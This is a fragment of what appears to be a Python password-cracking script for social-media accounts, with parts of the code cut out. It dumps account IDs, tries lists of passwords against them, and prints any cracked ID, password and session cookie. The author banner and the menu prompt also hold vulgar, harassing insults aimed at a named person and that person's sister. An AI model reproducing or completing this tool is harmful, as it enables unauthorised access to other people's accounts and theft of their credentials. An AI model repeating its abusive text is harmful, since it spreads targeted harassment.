   ...
   ░ ░░   ▒ ░░▒ ░                   
     ...
     ░                              
                     ...
                     A  
                                             Z     
                                                                  A
Author  : WE FUCKED @RANDOM5😂👌🏿
   Telegram: QUZE DAYKI @RANDOM5👌🏿
Github  : @QUZI XUSHKI RANDOM5
    Version : QUZE XUSHKE RANDOM
.1
------------------------------------------------------------                                                                                  ------------------------------------------------------------"""
os.system('clear')
print(logo)
...
def menu():
  ...
  ##  print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;92m "+date)
    ...
    DYAR = input('\033[1;37mCHOOSE FOR FUCKING @RANDOM SISTER😂👌🏿 :  ')
    if DYAR in ['111']:
        login()
        dump_massal()
    elif DYAR in ['1']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r \r[ BATA ] {P}{k}\033[1;37m{loop}\033[1;31m{P}  {P}{H}[ok] - {ok}{P}  {P}\033[1;31m{x}  {bo}{'{}'.format(loop/float(len(id)))}{P} "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\033[1;31mQUZI DAYKI-RANDOM5   \033[1;31m{idf} |  \033[1;31m{pw}  ')
                ...
                print(f'\r\x1b[32[QUZI_XUSHKI-RANDOMT-GA]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
